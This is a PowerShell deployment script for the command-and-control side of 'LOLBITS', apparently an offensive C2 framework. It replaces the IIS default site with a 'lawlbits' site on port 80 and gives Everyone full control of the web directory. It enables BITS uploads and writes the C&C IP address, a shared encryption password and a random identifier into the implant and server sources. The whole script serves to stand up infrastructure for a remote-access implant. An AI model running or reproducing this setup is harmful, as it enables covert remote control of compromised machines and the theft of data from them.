#requires -version 5.1

$path = 'C:\inetpub\wwwroot'

if (((Get-PackageProvider -Name NuGet).version -lt 2.8.5.201)){
    try {
        Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Confirm:0 -Force | Out-Null
        Write-Host "[+] Installed NuGet version =" (Get-PackageProvider -Name NuGet).version

    }
    catch [Exception]{
        Write-Host "[-] NuGet packet manager couldn't be installed. Relaunch this script with administrative privileges"
        exit
    }
}
else {
    Write-Host "[+] Version of NuGet installed =" (Get-PackageProvider -Name NuGet).version
}


if (Get-Module -ListAvailable -Name 'IISAdministration') {
    Write-Host "[+] IISAdministration module already installed"
} 
else {
    try {
        Install-Module -Name IISAdministration -Confirm:0 -Force | Out-Null
        Write-Host "[+] IISAdministration module installed"

    }
    catch [Exception] {
        Write-Host "[-] IISAdministration module couldn't be installed. Relaunch this script with administrative privileges"
        exit
    }
}

try {
	powershell -C "Stop-IISSite -Name 'Default Web Site' -Confirm:0 | Out-Null"
	powershell -C "Remove-IISSite -Name 'Default Web Site' -Confirm:0 | Out-Null"
	Write-Host "[+] IIS Default Site removed"

}
catch [Exception] {
	Write-Host "[-] IIS Defaut Site can't be removed. Relaunch this script with administrative privileges"
	exit
}

New-Item -ItemType Directory -Name 'lolbits' -Path $path | Out-Null
$path = $path + "\lolbits"
Write-Host "[+] lolbits directory created on path" $path


python -m pip install --upgrade pip | Out-Null
pip install colorama | Out-Null
pip install flask | Out-Null
pip install wfastcgi | Out-Null

$p = $env:path.split(";")
$pypath = ""
foreach($i in $p){
	if($i -Match "Python"){
		$pypath = $i
		break
	}
}

if($pypath -eq ""){
	$pypath = Read-Host -Prompt "[-] Python directory not found. Insert Python directory root path (e.g. C:\Program Files\Python3.4)"
} else {
	if ($pypath -Match "Scripts"){
		$pypath = $pypath.Replace("\Scripts\","")
	}
}


$temp = $pypath + "\Scripts\wfastcgi-disable.exe"
if ((Test-Path $temp -PathType leaf) -eq $false){
	Write-Host "[-] wfastcgi not properly installed. Check your Internet connectivity"
}

$temp = $pypath + "\lib\site-packages\wfastcgi.py"
if ((Test-Path $temp -PathType leaf) -eq $false){
	Write-Host "[-] wfastcgi not properly installed. Check your Internet connectivity"
}

$temp = $pypath + "\Scripts\wfastcgi-enable.exe"
if ((Test-Path $temp -PathType leaf) -eq $false){
	Write-Host "[-] wfastcgi not properly installed. Check your Internet connectivity"
}

try{
	iex $temp | Out-Null
	Write-Host "[+] wfastcgi enabled and FastCGI properly configured for IIS."
} catch [Exception] {
	Write-Host "[-] Error configuring FastCGI for IIS. Relaunch this script with administartive privileges"
	exit
}

try{
	New-IISSite -Name "lawlbits" -PhysicalPath $path -BindingInformation "*:80:" -Protocol http -Force
	Write-Host "[+] New Web Site 'lawlbits' created"
} catch [Exception] {
	Write-Host "[-] Error trying to create the new Web Site on IIS"
	exit
}

if (-not (Get-Module -ListAvailable -Name 'WebAdministration')) {
   try {
        Install-Module -Name WebAdministration -Confirm:$false -Force | Out-Null
        Write-Host "[+] WebAdministration module installed"

    }
    catch [Exception] {
        $_.message 
        exit
    }
} 

Import-Module WebAdministration

$fullPath = Get-WebConfigurationProperty -PSPath "MACHINE/WEBROOT/APPHOST" -filter "system.webserver/fastcgi/application" -Name "." | Select-Object fullPath 
$arguments = Get-WebConfigurationProperty -PSPath "MACHINE/WEBROOT/APPHOST" -filter "system.webserver/fastcgi/application" -Name "." | Select-Object arguments 
$scrProcessor = $fullPath.fullPath + "|" + $arguments.arguments

(Get-Content "C&C\web.config").replace('<ident1>',$scrProcessor) | Set-Content "C&C\web.config"
(Get-Content "C&C\web.config").replace('<ident2>',$path) | Set-Content "C&C\web.config"

$pass = Read-Host -Prompt "[*] Insert the password that will be used to encrypt the communications"
(Get-Content "LOLBITS\LOLBITS\Program.cs").replace('<ident3>',$pass) | Set-Content "LOLBITS\LOLBITS\Program.cs"
(Get-Content "C&C\myapp.py").replace('<ident4>',$pass) | Set-Content "C&C\myapp.py"
(Get-Content "C&C\lolbins\lawlbin.py").replace('<ident5>',$pass) | Set-Content "C&C\lolbins\lawlbin.py"

$ip = Read-Host -Prompt "[*] Insert C&C IP address (the IP address where the IIS is listening)"
(Get-Content "LOLBITS\LOLBITS\Program.cs").replace('<ident6>',$ip) | Set-Content "LOLBITS\LOLBITS\Program.cs"

$rand =  Write-Output ( -join ((0x30..0x39) + ( 0x41..0x5A) + ( 0x61..0x7A) | Get-Random -Count 9 | % {[char]$_}) )
(Get-Content "LOLBITS\LOLBITS\Program.cs").replace('<ident7>',$rand) | Set-Content "LOLBITS\LOLBITS\Program.cs"
(Get-Content "C&C\myapp.py").replace('<ident8>',$rand) | Set-Content "C&C\myapp.py"
(Get-Content "C&C\lolbins\lawlbin.py").replace('<ident9>',$rand) | Set-Content "C&C\lolbins\lawlbin.py"
Rename-Item -Path "C&C\files\abcde1234" -NewName $rand

Get-ChildItem -Path "C&C" -Recurse | Move-Item -Destination $path

try{

	$acl = Get-Acl -Path $path
	$accessrule = New-Object System.Security.AccessControl.FileSystemAccessRule('Everyone', 'FullControl', 'ContainerInherit, ObjectInherit', 'InheritOnly', 'Allow')
	$acl.SetAccessRule($accessrule)
	Set-Acl -Path $path -AclObject $acl

	cmd.exe /C "icacls $path /grant Everyone:(OI)(CI)F" | Out-Null

}
catch [Exception] {
	Write-Host "[-] Error setting files permissions. Relaunch this script with administrative privileges"
}

try{
	
	$obj = Get-Website -Name "lawlbits" | Select-Object ID
	$str ="IIS://localhost/W3SVC/" + $obj.id + "/Root"
	$root = new-object system.directoryservices.directoryentry($str)
	$root.EnableBITSUploads()

	Write-Host "[+] BITS Uploads enabled on lawlbins"
} 
catch [Exception] {
	Write-Host "[-] Bits Uploads not enabled. Use IIS Manager to manually enable this feature"
}

Write-Host "[+] Environment successfully deployed!!!"

#c:\windows\system32\inetsrv\appcmd.exe unlock config -section:system.webServer/security/requestFiltering